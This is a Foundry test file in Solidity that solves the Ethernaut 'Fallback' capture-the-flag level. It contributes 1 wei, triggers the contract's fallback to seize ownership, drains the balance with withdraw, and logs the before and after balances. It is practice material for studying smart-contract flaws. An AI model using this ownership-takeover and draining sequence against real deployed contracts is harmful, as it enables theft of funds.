pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/01-Fallback/FallbackFactory.sol';
import '../core/Ethernaut.sol';

contract FallbackTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testFallbackHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    FallbackFactory fallbackFactory = new FallbackFactory();
    ethernaut.registerLevel(fallbackFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
    Fallback fallbackContract = Fallback(payable(levelAddress));

    // sanity check to ensure factory is the current owner
    assertEq(fallbackContract.owner(), address(fallbackFactory));
    emit log_named_int(
        'Verify attacker is not the owner (bool): ', 
        fallbackContract.owner() == address(fallbackFactory) ? int256(1) : int256(0)
    );

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    fallbackContract.contribute{ value: 1 wei }(); // Fallback vulnerability setup

    // Confirm that attacker has contributed and contract has logged (required to trigger vuln)
    uint256 _attackerContribution = fallbackContract.getContribution();
    assertGe(_attackerContribution, 0);
    emit log_named_uint(
      'Verify contribution state change (wei value): ',
      _attackerContribution
    );

    // Triggering the `fallback()`. Setup allows us to pass 'require()' checks
    payable(address(fallbackContract)).call{ value: 1 wei }(''); 
    // ensure fallback() transferred ownership to attacker
    assertEq(fallbackContract.owner(), attacker); 

    emit log_named_uint(
      'Contract balance (before): ',
      address(fallbackContract).balance
    );
    emit log_named_uint('Attacker balance (before): ', attacker.balance);

    fallbackContract.withdraw(); // Drain smart contract funds
    assertEq(address(fallbackContract).balance, 0);

    emit log_named_uint(
      'Contract balance (after): ',
      address(fallbackContract).balance
    );
    emit log_named_uint('Attacker balance (after): ', attacker.balance);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}